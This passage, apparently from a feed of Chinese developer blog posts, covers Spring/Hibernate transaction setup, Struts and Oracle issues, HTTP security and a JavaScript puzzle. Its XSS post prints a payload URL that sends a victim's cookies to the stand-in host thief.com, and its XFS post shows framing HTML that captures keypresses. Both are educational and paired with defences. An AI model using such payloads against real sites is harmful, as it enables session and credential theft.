        http://www.springframework.org/schema/context/spring-context-3.0.xsd">
	<!-- 启动注解扫描 -->
	<mvc:annotation-driven/>
	<bean class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter"/>
	
	<!-- 扫描Controller注解 -->
	<context:component-scan base-package="com.springmvc" use-default-filters="false">
		<context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
		<context:exclude-filter type="annotation" expression="org.springframework.stereotype.Service" />
	</context:component-scan>
	<!-- 配置视图 -->
	<bean
		class="org.springframework.web.servlet.view.ContentNegotiatingViewResolver">
		<property name="mediaTypes">
			<map>
				<entry key="html" value="text/html" />
				<entry key="json" value="application/json" />
			</map>
		</property>
		<property name="viewResolvers">
			<list>
				<bean class="org.springframework.web.servlet.view.BeanNameViewResolver" />
				<bean
					class="org.springframework.web.servlet.view.InternalResourceViewResolver">
					<property name="prefix" value="/WEB-INF/views/" />
					<property name="suffix" value=".jsp" />
				</bean>
			</list>
		</property>
		<property name="defaultViews">
			<list>
				<bean
					class="org.springframework.web.servlet.view.json.MappingJacksonJsonView" />
			</list>
		</property>
	</bean>
</beans>
 applicationContext-db.xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
	xmlns:aop="http://www.springframework.org/schema/aop"
	xmlns:tx="http://www.springframework.org/schema/tx" 
	xmlns:context="http://www.springframework.org/schema/context"
	xsi:schemaLocation="
     http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
     http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-3.0.xsd
     http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd"
	default-autowire="byName">
	
	<!-- 配置数据源 -->
	<bean id = "mappings" class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
		<property name="locations" value="classpath:dataSources.properties"></property>
	</bean> 
	
	<bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource">
		<property name="driverClassName" value="${driverClassName}" />
		
		<property name="url" value="${url}" />
		<property name="username" value="${username}" />
		<property name="password" value="${password}" />
		<property name="maxActive" value="${maxActive}" />
		<property name="maxIdle" value="${maxIdle}" />
		<property name="maxWait" value="${maxWait}" />
		<property name="defaultAutoCommit" value="${defaultAutoCommit}" />
	</bean>
	
	<!-- 配置sessionFactory -->
	<bean id="sessionFactory" class="org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean">
		<property name="dataSource" ref="dataSource"/>
		<!-- 扫描的domain包路径 -->
		<property name="packagesToScan" value="com.springmvc.domain"/>
		<property name="hibernateProperties">
			<props>
				<prop key="hibernate.dialect">${hibernate.dialect}</prop>
				<prop key="hibernate.show_sql">true</prop>
				<prop key="hibernate.hbm2ddl.auto">none</prop>
				<prop key="hibernate.search.default.directory_provider">org.hibernate.search.store.FSDirectoryProvider</prop> 
				<prop key="hibernate.search.default.transaction.merge_factor">100</prop>	
				<prop key="hibernate.search.default.transaction.max_buffered_docs">100</prop> 
				<prop key="hibernate.search.autoregister_listeners">true</prop> 
				<prop key="hibernate.search.indexing_strategy">manual</prop> 
			</props>
		</property>
	</bean>
	
	<bean id="transactionManager" class="org.springframework.orm.hibernate3.HibernateTransactionManager">
		<property name="sessionFactory" ref="sessionFactory"/>
	</bean>
	
	<bean id="jdbcTemplate" class="org.springframework.jdbc.core.JdbcTemplate">
		<property name="dataSource" ref="dataSource"/>
	</bean>
	
	<tx:annotation-driven transaction-manager="transactionManager" proxy-target-class="true"/>
	
</beans>
 applicationContext-aop.xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
	xmlns:aop="http://www.springframework.org/schema/aop"
	xmlns:tx="http://www.springframework.org/schema/tx"
	xmlns:context="http://www.springframework.org/schema/context"
	xsi:schemaLocation="http://www.springframework.org/schema/beans 
			http://www.springframework.org/schema/beans/spring-beans-2.5.xsd
			http://www.springframework.org/schema/context 
			http://www.springframework.org/schema/context/spring-context-3.0.xsd
			http://www.springframework.org/schema/tx 
			http://www.springframework.org/schema/tx/spring-tx-3.0.xsd
            http://www.springframework.org/schema/aop 
            http://www.springframework.org/schema/aop/spring-aop-2.5.xsd"
	default-autowire="byName">
	
	<context:annotation-config />
	<context:component-scan base-package="com.springmvc"> 
		<context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
	</context:component-scan> 
	
	<aop:aspectj-autoproxy proxy-target-class="true" />
	
	<tx:advice id="txAdvice" transaction-manager="transactionManager">
		<tx:attributes>
			<tx:method name="update*" propagation="REQUIRED"/>  
            <tx:method name="save*" propagation="REQUIRED"/>  
            <tx:method name="add*" propagation="REQUIRED" rollback-for="Exception"/>  
            <tx:method name="create*" propagation="REQUIRED"/>  
            <tx:method name="do*" propagation="REQUIRED"/>  
            <tx:method name="del*" propagation="REQUIRED"/>  
            <tx:method name="remove*" propagation="REQUIRED"/>  
	        <tx:method name="get*" read-only="true" />  
	        <tx:method name="query*" read-only="true" />  
	        <tx:method name="find*" read-only="true" />  
	        <tx:method name="*"/>  
		</tx:attributes>
	</tx:advice>
	<aop:config proxy-target-class="true">
		<aop:pointcut expression="execution(public * com.springmvc.service.impl.*ServiceImpl.*(..))" id="allServiceMethod"/>
		<aop:advisor pointcut-ref="allServiceMethod"   advice-ref="txAdvice" />
	</aop:config>
</beans>
  UserServiceImpl@Service(value = "userService")
@Transactional(rollbackFor=Exception.class)
public class UserServiceImpl implements UserService {
	@Autowired
	private UserDAO userDAO;
	@Override
	public void addUser(User user) {
			userDAO.addUser(user);
	}
} UserDAOImpl@Repository(value = "userDAO")
public class UserDAOImpl extends HibernateDaoSupport implements UserDAO {
	private Logger logger = Logger.getLogger(getClass());
	
	@Override
	public void addUser(User user) {
		logger.debug("新增用户");
		this.getHibernateTemplate().save(user);
	} UserServiceTest@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations={"file:webroot/WEB-INF/springmvc-servlet.xml","classpath:applicationContext-*.xml"})
public class UserServiceTest{
	@Autowired
	private UserService userService;
	
	@Test
	public void testAddUser() {
		
		User user1 = new User();
		user1.setCode("A002");
		user1.setName("haha");
		userService.addUser(user1);
		
		User user2 = new User();
		user2.setCode("A001");
		user2.setName("haha");
		userService.addUser(user2);
		
		User user3 = new User();
		user3.setCode("A001");//code是唯一的,这里报唯一约束错误，前面两条数据是不是应该插入失败？
		user3.setName("haha");
		userService.addUser(user3);
	}
} 就在这里找不到问题了，use3前面写个更新也不行,user2还是会被更新，网上说扫描controller和service的时候分开，我也分开了，难道是DAO有问题还是怎么的，还是说配置有问题，望来位高人指点一二
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
发布的WebService别人调用时出现org.xml.sax.SAXexception, java-lxm.iteye.com.blog.1909993, Fri, 19 Jul 2013 09:35:34 +0800
发布的webservice,返回的一个json，php调用的时候有一定几率出现org.xml.sax.SAXexception，不知道是什么原因
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
关于<s:select/>不能显示默认值得问题, java-lxm.iteye.com.blog.1210645, Mon, 24 Oct 2011 14:34:22 +0800

<s:select value="%{#user.post.id}" name="user.post.id" list="#postList" listValue="post_name" listKey="id" headerKey="" headerValue="----请选择----" />
 注意：如果value写成value="%{#user.post.post_name}" 这样是显示不出默认值，value的类型必须与listKey的类型相同  我的Post类private Long id,而user.post.post_name 为String 类型 
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
sshjar, java-lxm.iteye.com.blog.1181007, Mon, 26 Sep 2011 22:08:54 +0800
简单的ssh整合，里面有需要的jar
              
  
    本文附件下载:
    
      ssh.rar (19.9 KB)
sshjar1.rar (7.4 MB)
sshjar.rar (9 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
hibernate常见异常, java-lxm.iteye.com.blog.1170951, Tue, 13 Sep 2011 15:32:12 +0800
/如果不用，启动时不会出错，但使用Dwr时，会抛出异常：java.lang.NoClassDefFoundError: antlr/ANTLRException   antlr-2.7.2.jar　     //如果不用此包，在启动时会抛出： nested exception is java.lang.NoClassDefFoundError: org/objectweb/asm/Type   asm.jar     //如果不用此包，在启动时抛出：nested exception is java.lang.NoClassDefFoundError: org/aspectj/weaver/reflect/ReflectionWorld$ReflectionWorldException   aspectjweaver.jar     //如果不用此包，在启动时抛出：nested exception is java.lang.NoClassDefFoundError: net/sf/cglib/proxy/CallbackFilter   cglib-2.1.3.jar     //如果不用此包，在启动时抛出：nested exception is java.lang.NoClassDefFoundError: org/apache/commons/collections/SequencedHashMap   commons-collections-3.1.jar     //这个似乎可以不用的   commons-fileupload-1.2.1.jar     //这个就不用说啦，几乎所有框架都要使用的   commons-logging-1.0.4.jar     //如果不用此包会抛出：java.lang.NoClassDefFoundError: org/dom4j/DocumentException   dom4j-1.6.1.jar     //dwr必须   dwr.jar       //不用此包，在启动时招聘：java.lang.NoClassDefFoundError: javax/transaction/TransactionManager   jta.jar     //Mysql　JDBC驱动   mysql-connector.jar     //Hibernate必须使用，注意此包是包含全部的。   hibernate3.jar     //Spring整体包   spring.jar                 //struts2必须                  freemarker-2.3.8.jar      //struts2必须   ognl-2.6.11.jar          //struts2核心包   struts2-core-2.0.11.2.jar   //struts2整合Spring插件     struts2-spring-plugin-2.0.11.2.jar   //struts2必须   xwork-2.0.5.jar   
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
在java中调用oracle函数或存储过程, java-lxm.iteye.com.blog.1169158, Fri, 09 Sep 2011 10:54:25 +0800
摘自：http://tech.it168.com/jd/2008-02-21/200802211630632.shtml 
/**
　　调用数据库里的一个函数
　　一个函数本质上一个返回一个结果的存储过程，这个例子示范了怎么调用有in、out和in/out参数的函数
　　***********************************/
　　CallableStatement cs;
　　try {
　　// 调用一个没有参数的函数; 函数返回 a VARCHAR
　　// 预处理callable语句
　　cs = connection.prepareCall("{? = call myfunc}");
　　// 注册返回值类型
　　cs.registerOutParameter(1, i);
　　// Execute and retrieve the returned value
　　cs.execute();
　　String retValue = cs.getString(1);
　　// 调用有一个in参数的函数; the function returns a VARCHAR
　　cs = connection.prepareCall("{? = call myfuncin(?)}");
　　// Register the type of the return value
　　cs.registerOutParameter(1, Types.VARCHAR);
　　// Set the value for the IN parameter
　　cs.setString(2, "a string");
　　// Execute and retrieve the returned value
　　cs.execute();
　　retValue = cs.getString(1);
　　// 调用有一个out参数的函数; the function returns a VARCHAR
　　cs = connection.prepareCall("{? = call myfuncout(?)}");
　　// Register the types of the return value and OUT parameter
　　cs.registerOutParameter(1, Types.VARCHAR);
　　cs.registerOutParameter(2, Types.VARCHAR);
　　// Execute and retrieve the returned values
　　cs.execute();
　　retValue = cs.getString(1);　　　　　 // return value
　　String outParam = cs.getString(2);　　// OUT parameter
　　// 调用有一个in/out参数的函数; the function returns a VARCHAR
　　cs = connection.prepareCall("{? = call myfuncinout(?)}");
　　// Register the types of the return value and OUT parameter
　　cs.registerOutParameter(1, Types.VARCHAR);
　　cs.registerOutParameter(2, Types.VARCHAR);
　　// Set the value for the IN/OUT parameter
　　cs.setString(2, "a string");
　　// Execute and retrieve the returned values
　　cs.execute();
　　retValue = cs.getString(1);　　　　　 // return value
　　outParam = cs.getString(2);　　　　　 // IN/OUT parameter
　　} catch (SQLException e) {
　　}
    本文附件下载:
    
      java调用oracle函数或存储过程方式.rar (20.4 KB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
jbpm伤不起啊, java-lxm.iteye.com.blog.1167821, Wed, 07 Sep 2011 17:08:47 +0800
研究了一大堆的JBPM，但是应用到实际中就这样那样的问题出来了，纠结哦
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
eclipse中导入外部web工程(非eclipse创建)时，不能运行的解决办法, java-lxm.iteye.com.blog.1166346, Tue, 06 Sep 2011 10:18:23 +0800
eclipse中导入外部web工程时，在服务器中有时候看不到项目，解决办法------------------------------------------------------------------打开导入工程的.project文件，在<natures></natures>中加入如下代码： <nature>org.eclipse.wst.common.project.facet.core.nature</nature>  
<nature>org.eclipse.wst.common.modulecore.ModuleCoreNature</nature>  
<nature>org.eclipse.jem.workbench.JavaEMFNature</nature> 
  在<buildSpec></buildSpec>中加入如下代码 
<buildCommand>  
    <name>org.eclipse.wst.common.project.facet.core.builder</name>  
    <arguments>  
    </arguments>  
</buildCommand>  
<buildCommand>  
    <name>org.eclipse.wst.validation.validationbuilder</name>  
    <arguments>  
    </arguments>  
</buildCommand>  -------------------------------------------------------------------- 最后刷新项目，选择项目->点击project->properties->Project Facets->选中Java和Dynamic Web Module即可
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
eclipse项目中关于导入的项目里提示HttpServletRequest 不能引用的解决办法, java-lxm.iteye.com.blog.1166332, Tue, 06 Sep 2011 10:06:08 +0800
当使用eclipse导入外部的web工程时，有时会提示HttpServletRequest找不到的情况，解决办法：----------------------------------------------------选中项目-->properties-->Targeted Runtimes-->在右边窗口中选择你使用的服务器即可
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
struts1 redirect issue, cuishen.iteye.com.blog.2064118, Thu, 08 May 2014 23:04:48 +0800
近日突然发现struts1 的redirect有很大的限制，它只能redirect到APP domain下的某个URL，超出了domain的resource是无法访问的（如web server上的html）！ 例如：可以redirect 到以下URL：
http://cuishen.iteye.com/APP/test.jsp
 但是无法redirect 到超出APP的URL：
http://cuishen.iteye.com/test.html
  具体见下面代码：
@see org.apache.struts.action.RequestProcessor
/* 447*/        if(forward.getRedirect())
                {
                    //斜杠开头的URL会自动加上APP名的
/* 449*/            if(uri.startsWith("/"))
/* 450*/                uri = request.getContextPath() + uri;
/* 452*/            response.sendRedirect(response.encodeRedirectURL(uri));
                } else
                {
/* 455*/            doForward(uri, request, response);
                }
  而且注意，如果不指定具体的action type，redirect是不起作用的！例如下面的action例子，redirect不工作，因为没有指定具体的type：
<action path="/user/ErrorPage" forward="/WEB-INF/jsp/ServerError.jsp" redirect="true"/>
  要让redirect工作，应该像下面这样配置：
        <action path="/user/ErrorPage" type="xxx.xxx.XxxAction">
        	<forward name="success" path="/ServerError.jsp" redirect="true"/>
        </action>
  具体参见RequestProcessor的代码。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Oracle 的大小写敏感引起的表不存在问题, cuishen.iteye.com.blog.2044210, Sat, 12 Apr 2014 21:55:33 +0800
Oracle如果大小写敏感，可能引起表不存在的Exception. 例如下面的SQL:
select * from TABLE_NAME
  可能会引起下面的异常：
java.sql.SQLSyntaxErrorException: ORA-00942: table or view does not exist
        at oracle.jdbc.driver.SQLStateMapping.newSQLException(SQLStateMapping.java:91)
        at oracle.jdbc.driver.DatabaseError.newSQLException(DatabaseError.java:133)
        at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:206)
        at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:455)
        at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:413)
        at oracle.jdbc.driver.T4C8Oall.receive(T4C8Oall.java:1034)
        at oracle.jdbc.driver.T4CPreparedStatement.doOall8(T4CPreparedStatement.java:194)
  解决方案是： SQL写成这样:
SELECT * FROM TABLE_NAME
 或
select * fRom TABLE_NAME
  或者干脆关闭大小写敏感。 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Print when Textarea has overflow, cuishen.iteye.com.blog.2037647, Thu, 27 Mar 2014 17:40:04 +0800
Hi All, I’d like to simply share to spread the knowledge, what I have been looking for this lately.This is used in one of my projects at work, so far this code looks good on differentbrowsers (it’s been successfully tested on Firefox 27.0.1, IE 8.0, Chrome 26.0.1410.64 m, Opera 12, Safari 4.0.5) I got this code from stackoverflow. HTML - put a DIV behind the textarea, which only be used during print..
<textarea name="textarea" wrap="wrap" id="the_textarea"> </textarea>
<div id="print_helper"></div>
  CSS (All / Non Print) 
<style type="text/css" media="all">
	/* Styles for all media */
	#print_helper {
	  display: none;
	}
</style>
  CSS (Print) - use 'media="print"' can help the CSS only take effect during print..
<style type="text/css" media="print">
  /* Styles for print */
	#print_helper { 
		display: block;
		overflow: visible;
		font-family: Menlo, "Deja Vu Sans Mono", "Bitstream Vera Sans Mono", Monaco, monospace;
		white-space: pre;
		white-space: pre-wrap;
	}
	#the_textarea {
	  display: none;
	}
	#print_placeholder:after {
		content: "The print stylesheet has been applied. ✓";
		display: inline;
	}
</style>
  Javascript (JQuery) - make sure the "copy_to_print_helper()" be called before print, which help to sync the content in textarea to DIV, and finally print the DIV instead of textarea.
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
<script type="text/javascript">
jQuery(function($){
  function copy_to_print_helper(){
    $('#print_helper').text($('#the_textarea').val());
  }
  $('#the_textarea').bind('keydown keyup keypress cut copy past blur change', function(){
    copy_to_print_helper();
  });
  copy_to_print_helper();
});
</script>
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Cookie 和 sessionStorage的区别, cuishen.iteye.com.blog.2033072, Tue, 18 Mar 2014 23:21:31 +0800
expire设为null的cookie是session scope的，尽管是存储在内存中，但是它是浏览器的多Tab共享的，因为它是可以持久化存储在client端的磁盘上，所以也很好理解。。 sessionStorage 是html5 中引入的一个对象，可以方便的在client端存储数据，既然是session storage，所以它也是session scope的，是存储在内存中的，但是它和cookie有个最大的不同是： 浏览器的multi-Tab无法共享sessionStorage！！ 我测试了Opera v12 / IPAD Safari都是这样。。 因此，如果你要support的浏览器都是支持html5的，那么合理运用sessionStorage将有效的帮助你防御多Tab带来的浏览器安全性问题。
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
http https get post 的区别，定义/安全性/性能, cuishen.iteye.com.blog.2019925, Thu, 20 Feb 2014 18:19:04 +0800
HTTP / HTTPS request 的 get / post 方法的区别： A. 定义及安全性的区别： refer：http://blog.csdn.net/csj50/article/details/5687850http://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html B. 性能区别： 据Yahoo mail team 说： post方法在AJAX 请求下会被拆分成两个： sending header first, then sending data;  逆向思维： post的请求如果没有data string，那么性能上应该和get是相同的。 refer：http://developer.yahoo.com/performance/rules.html#ajax_get引用The Yahoo! Mail team found that when using XMLHttpRequest, POST is implemented in the browsers as a two-step process: sending the headers first, then sending data. So it's best to use GET, which only takes one TCP packet to send (unless you have a lot of cookies). The maximum URL length in IE is 2K, so if you send more than 2K data you might not be able to use GET. An interesting side affect is that POST without actually posting any data behaves like GET. Based on the HTTP specs, GET is meant for retrieving information, so it makes sense (semantically) to use GET when you're only requesting data, as opposed to sending data to be stored server-side.   C. 安全性扩展 据说在https下除了URL中host path （e.g. "https://cuishen.iteye.com/blog/2017537" 中的"cuishen.iteye.com"） 部分是明文的，其他任何请求内容/应答都是加密的，所以从这个角度讲： 相对http GET而言，https下的GET方法更安全些，至少黑客在监听信道的时候只能拿到密文； 但是因为GET方法的URL会出现在浏览器的address bar和history里面(https下也是这样)，所以依然是个安全隐患。 所以说，在四种组合下面，https + post是最安全的组合！ refer：http://stackoverflow.com/questions/499591/are-https-urls-encryptedhttp://www.cnblogs.com/zhuqil/archive/2012/07/23/2604572.html  --------------------Add some founding: 尽管AJAX下的https GET请求的URL不会被记录在browser的history里面，但是会被记录在Firefox的memory cache里面： try below URL in Firefox:
about:cache?device=memory
 POST方法则不会！！So, 在一些安全性要求比较高的场合，还是尽量避免使用GET方法吧！ 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
struts1的tiles导致的response cache无法禁止的issue, cuishen.iteye.com.blog.2017537, Sat, 15 Feb 2014 00:13:41 +0800
近日struts 1项目中遇到一个很怪异的问题，项目中的所有.do都是继承自同一个root tiles，根JSP里面有把cache禁掉：
response.setHeader("Cache-Control", "no-cache, must-revalidate, proxy-revalidate, no-store");
response.setHeader("Pragma", "no-cache");
response.setHeader("Expires", "0");
response.setDateHeader("Expires", 0L);
 但是在firebug里面看http response，大部分.do的response都没有cache，但是有个别.do的response cache依旧存在。。。 真见鬼了。。。 后仔细比对struts-config，发现那两个特殊的.do，都是在tiles里面forward到了其他.do:
<action path="/Index" type="com.cuishen.HomeAction">
	<forward name="success" path="success.home"/>
</action>
 
<definition name="success.home" path="/user/info.do" />
 上例中"/Index.do"和"/user/info.do"都是继承的相同的根JSP，但是访问"/Index.do"页面会被缓存，直接访问"/user/info.do"则不会！ 后将"/Index.do"中的tiles移除，直接forward到"/user/info.do"，后问题解决（如下代码）！ （我擦，一般人还真想不到！！）
<action path="/Index" type="com.cuishen.HomeAction">
	<forward name="success" path="/user/info.do"/>
</action>
  
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
设计模式---观察者模式(Observer Pattern with java), cuishen.iteye.com.blog.1929213, Thu, 22 Aug 2013 12:26:40 +0800
java中的 Listener - Event 是应用了设计模式---观察者模式(Observer Pattern with java)。 其本质就是用callback 回调将两个相互依赖调用的类进行解耦。 下面这篇blog写的不错，将观察者模式讲的很清楚。 http://www.cnblogs.com/syxchina/archive/2011/10/06/2199921.html
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
XFS攻击一例, cuishen.iteye.com.blog.1924097, Tue, 13 Aug 2013 17:50:57 +0800
XFS： Cross Frame Script (跨框架脚本) 攻击。 什么是XFS攻击，下面举一个例子： Tom在QQ上发消息诱骗Jerry点击了下面的连接：
http://thief.com
 上面的连接返回了下面的html：
<html>
<head>
<title>IE Cross Frame Scripting Restriction Bypass Example</title>
<script>
function alertKey(e) {
	alert("key press = '" + e.which + "'");
}
</script>
</head>
<frameset onload="this.focus();" onblur="this.focus();" cols="100%" onkeypress="alertKey(event);">
 <frame src="http://cuishen.iteye.com/" scrolling="auto">
</frameset>
</html>
 对于Jerry来说，他以为自己在访问熟悉的网站，殊不知将输入的敏感信息暴露给了Tom （只要将上面alert 改成ajax call）。 魔高一尺，道高一丈，对于XFS攻击也有防御的办法。主要算法是： A. 对于确定你的网站没有使用frame的页面要打破frame （frame busting）
        <style>
                html { visibility:hidden; }
        </style>
        <script>
                if( self == top){
                        document.documentElement.style.visibility='visible';
                }else{
                        top.location = self.location;
                }
        </script>
 B. 对于有使用iframe 和frame的页面当心anti-busting，换做下面的脚本：
if top <> self then
    if top.location.hostname <> self.location.hostname then
        top.location = "http://cuishen.iteye.com/"
    end if
end if
  你的网站可能会毫不知情的被外面包裹一层frame，而变成了一个钓鱼网站，so... 请尽量避免在你的网站使用frame/iframe，并且应用frame busting脚本。 对于user来说，请升级到IE7以上浏览器，并设置：Navigate sub-frames across different domainsset to "Prompt" or "Disable"， 这个将在浏览器层面防御XFS攻击。
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
XSS攻击一例, cuishen.iteye.com.blog.1923647, Mon, 12 Aug 2013 17:55:19 +0800
XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的.  比如获取用户的Cookie，导航到恶意网站,携带木马等。  下面一个例子演示怎样进行XSS攻击： Tom发现"Victim.com"网站有个XSS漏洞，而Jerry是"Victim.com"的用户，有一天他收到了QQ上的消息，让他点击下面的连接：
http://victim.com/signon.do?term=<script>window.open("http：//thief.com?cookie="+document.cookie)</script>
 Jerry认为"Victim.com"他经常访问，所以毫不犹豫的点击了连接，后果是Jerry在"Victim.com"的所有cookie信息被Tom窃取。 攻击的过程是三个步骤：step 1. 诱骗受害人点击钓鱼连接，或者访问钓鱼网站。step 2. XSS漏洞网站的server端没有对client input做校验，也没有对output做过滤和转码。step 3. 返回的jsp里面有漏洞参数，上例是"term"，当返回到client端后，问题脚本就被执行了。 所以防范XSS攻击也很简单：A. 对于用户来说，千万小心钓鱼连接和钓鱼网站。B. 对于我们的网站来说，在server端一定要对input做校验，对output转码！
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
maven3 compile failed, class file not found issue, cuishen.iteye.com.blog.1908048, Tue, 16 Jul 2013 18:31:42 +0800
今日maven3 build 老是失败，停在compile，报class file for XXX not found error，但是那个jar明明是在依赖里面啊。 后开debug模式，发现那个jar没有加到class path里面，可能是win XP下面万恶的路径长度限制吧，后缩短了仓库和代码的路径后，问题解决。
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JavaScript Puzzlers 解密（一）：为什么 ["1", "2", "3"].map(parseInt) 返回 [1, NaN, NaN]？, justjavac.iteye.com.blog.2019153, Wed, 19 Feb 2014 10:58:01 +0800

JavaScript Puzzlers! 被称为 javascript 界的专业八级测验，感兴趣的 jser 可以去试试。 我试了一下， 36 道题只做对了 19 道， 算下来正确率为 53%，还没有及格。
第一题为 ["1", "2", "3"].map(parseInt) 的返回值。
> ["1", "2", "3"].map(parseInt)
[1, NaN, NaN]
在 javascript 中 ["1", "2", "3"].map(parseInt) 为何返回不是 [1, 2, 3] 却是 [1, NaN, NaN]？
我们首先回顾一下 parseInt() 个 map() 两个函数的用法：
parseInt() 函数
定义和用法
parseInt() 函数可解析一个字符串，并返回一个整数。
语法
parseInt(string, radix)
参数
描述
string
必需。要被解析的字符串。
radix
可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。
如果省略该参数或其值为 `0`，则数字将以 10 为基础来解析。如果它以 `"0x"` 或 `"0X"` 开头，将以 16 为基数。
如果该参数小于 2 或者大于 36，则 `parseInt()` 将返回 `NaN`。
返回值
返回解析后的数字。
说明
当参数 radix 的值为 0，或没有设置该参数时，parseInt() 会根据 string 来判断数字的基数。
举例：
如果 string 以 "0x" 开头，parseInt() 会把 string 的其余部分解析为十六进制的整数。
如果 string 以 0 开头，那么 ECMAScript v3 允许 parseInt() 的一个实现把其后的字符解析为八进制或十六进制的数字。
如果 string 以 1 ~ 9 的数字开头，parseInt() 将把它解析为十进制的整数。
提示和注释
注释：只有字符串中的第一个数字会被返回。
注释：开头和结尾的空格是允许的。
提示：如果字符串的第一个字符不能被转换为数字，那么 parseInt() 会返回 NaN。
实例
在本例中，我们将使用 parseInt() 来解析不同的字符串：
parseInt("10");         // 返回 10 (默认十进制)
parseInt("19",10);      // 返回 19 (十进制: 10+9)
parseInt("11",2);       // 返回 3 (二进制: 2+1)
parseInt("17",8);       // 返回 15 (八进制: 8+7)
parseInt("1f",16);      // 返回 31 (十六进制: 16+15)
parseInt("010");        // 未定：返回 10 或 8
map 方法
对数组的每个元素调用定义的回调函数并返回包含结果的数组。
array1.map(callbackfn[, thisArg])
参数
定义
array1
必需。一个数组对象。
callbackfn
必需。一个接受**最多**三个参数的函数。对于数组中的每个元素，`map` 方法都会调用 `callbackfn` 函数一次。
thisArg
可选。可在 `callbackfn` 函数中为其引用 `this` 关键字的对象。如果省略 `thisArg`，则 `undefined` 将用作 `this` 值。
返回值
其中的每个元素均为关联的原始数组元素的回调函数返回值的新数组。
异常
如果 callbackfn 参数不是函数对象，则将引发 TypeError 异常。
备注
对于数组中的每个元素，map 方法都会调用 callbackfn 函数一次（采用升序索引顺序）。 不为数组中缺少的元素调用该回调函数。
除了数组对象之外，map 方法可由具有 length 属性且具有已按数字编制索引的属性名的任何对象使用。
回调函数语法
回调函数的语法如下所示：
function callbackfn(value, index, array1)
可使用最多三个参数来声明回调函数。
下表列出了回调函数参数。
回调参数
定义
value
数组元素的值。
index
数组元素的数字索引。
array1
包含该元素的数组对象。
修改数组对象
数组对象可由回调函数修改。
下表描述了在 map 方法启动后修改数组对象所获得的结果。
`map` 方法启动后的条件
元素是否传递给回调函数
在数组的原始长度之外添加元素。
否。
添加元素以填充数组中缺少的元素。
是，如果该索引尚未传递给回调函数。
元素被更改。
是，如果该元素尚未传递给回调函数。
从数组中删除元素。
否，除非该元素已传递给回调函数。
示例
下面的示例阐释了 map 方法的用法。
// 定义回调函数
// 计算圆的面积
function AreaOfCircle(radius) { 
    var area = Math.PI * (radius * radius); 
    return area.toFixed(0); 
} 
// 定义一个数组，保护三个元素
var radii = [10, 20, 30]; 
// 计算 radii 的面积. 
var areas = radii.map(AreaOfCircle); 
document.write(areas); 
// 输出: 
// 314,1257,2827
下面的示例阐释 thisArg 参数的用法，该参数指定对其引用 this 关键字的对象。
// 定义一个对象 object，保护 divisor 属性和 remainder 方法
